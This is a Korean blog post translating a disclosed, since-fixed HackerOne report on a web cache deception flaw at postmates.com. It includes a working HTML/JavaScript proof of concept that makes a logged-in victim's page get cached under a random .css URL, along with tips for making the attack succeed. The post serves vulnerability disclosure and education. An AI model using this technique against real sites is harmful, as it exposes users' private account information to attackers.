---
layout: post
title: 사용자 정보를 유출시킬 수 있는 웹 캐시 포이즈닝 (postmates.com)
categories: PoC
tags: [Bugbounty, CachePoisoning, Translation, Hackerone]
---
Web Cache Poisoning에 대해 설명되어있는 유튜브 영상 :
{% include youtube_embed.html id="1d1tUefYn4U" %}
- - -
출처 : [hackerone hacktivity, 작성자 : David Albert (davidalbert)] https://hackerone.com/reports/492841

_[ 본 이슈는 해결 된 상태이며, 취약점은 한국시각으로 2019년 2월 26일 오후 9시 37분에 공개되었습니다. Postmates에 리포팅 되었으며, 해당 페이지는 Postmates의 자산입니다. 취약점의 종류는 Violation of Secure Design Principles이며, 포상금은 $500달러로 한화로 약 57만원 입니다. 해당 취약점은 해당 도메인에서 8.2/10 정도의 심각성을 내포하고 있습니다. ]_
- - -
# 설명
안녕하세요,

당신의 웹 서버는 웹 캐시 포이즈닝 공격에 취약합니다. 이 말은 즉, 공격자가 다른 사용자의 정보를 탈취할 수 있다는 것입니다.

예를 들어, 당신이 이 페이지에 방문하여 로그인을 한다고 가정하면 : https://postmates.com/SomeRandomText.css

서버는 캐시에 그 정보를 저장할 것입니다. 하지만 로그인 된 사용자의 정보가 저장이 될 것입니다 🙂 로그인하지 않은 사용자 여기 해당 사이트에 방문이 가능하며 그곳에 저장되어있는 정보를 볼 수 있습니다. 이 경우에는 다음 url이 해당됩니다 : https://postmates.com/SomeRandomText.css

저는 간단한 javascript/html 코드를 작성했고, 이것은 해당 공격을 완전히 자동화해서 실행시킬 수 있는 코드로, 당신은 해당 사이트에 방문해 3초만 기다리시면 됩니다.

여기 간단한 개념증명(PoC) 코드가 있습니다 :
{% highlight html %}
<html>
<head>
</head>
<body>
<script>
    var cachedUrl = 'https://postmates.com/' + generateId() + '.css';
    const popup = window.open(cachedUrl);

    function generateId() {
        var content = '';
        const alphaWithNumber = 'QWERTZUIOPASDFGHJUKLYXCVBNM1234567890';

        for (var i = 0; i < 10; i++) {
            content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
        }
        return content;
    }

    var checker = setInterval(function() {
        if (popup.closed) {
            clearInterval(checker);
        }
    }, 200);
    var closer = setInterval(function() {
        popup.close();
        document.body.innerHTML = 'Victims content is now cached <a href="' + cachedUrl + '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' + cachedUrl + '</b>'; 
        clearInterval(closer);
    }, 3000);

</script>
</body>
</html>
{% endhighlight %}

**Pic Links:**  
[1_Logged_in_(Normal)]({{site.baseurl}}/images/1_Logged_in_(Normal).png)  
[2_Logged_in_(Normal)]({{site.baseurl}}/images/2_Logged_in_(Normal).png)  
[3_Not_Logged_in_(Private_Mode)]({{site.baseurl}}/images/3_Not_Logged_in_(Private_Mode).png)  
[4_Not_Logged_in_(Private_Mode)]({{site.baseurl}}/images/4_Not_Logged_in_(Private_Mode).png)  
[5_Logged_in_Victim_visits_attackers_website_(Normal)]({{site.baseurl}}/images/5_Logged_in_Victim_visits_attackers_website_(Normal).png)  
[6_Everyone_can_see_the_logged_in_content_on_this_website_(Private_Mode)]({{site.baseurl}}/images/6_Everyone_can_see_the_logged_in_content_on_this_website_(Private_Mode).png)  
![7_Attacker_can_get_important_informations_(Private_Mode)]({{site.baseurl}}/images/7_Attacker_can_get_important_informations_(Private_Mode).png)  

이론상으로, 공격자는 이 정보를 그 자신만의 서버에 저장할 수 있지만, 이 예시에서는 URL이 단지 보여지기만 했습니다. 웹사이트 보안을 위해 꾸준히 지켜봐주셨으면 합니다 그리고 제 리포트가 도움이 되었길 희망합니다.

해당 공격에 대한 몇가지 정보 : https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf

덧1) 개념증명(PoC) 프로젝트로써, 팝업을 허용하는 것은 중요합니다. 깜빡했네요 여기 첨부 파일이 있습니다 :  
<a href="{{site.baseurl}}/attach/postmatesPoC.html" download>postmates PoC 다운로드</a>

덧2) 지난번에 전혀 방문하지 않았던 URL이어야 합니다. 그러면 성공할 것이고 서버는 정보를 저장하게 될 것 입니다. URL의 끝은 반드시 ".css"로 해주세요.
- - -
# 영향
웹 캐시 포이즈닝 공격은 로그인 보안에 중요한 이름과 멤버 아이디와 같은 사용자 정보들을 훔칠 수 있습니다(예시로요).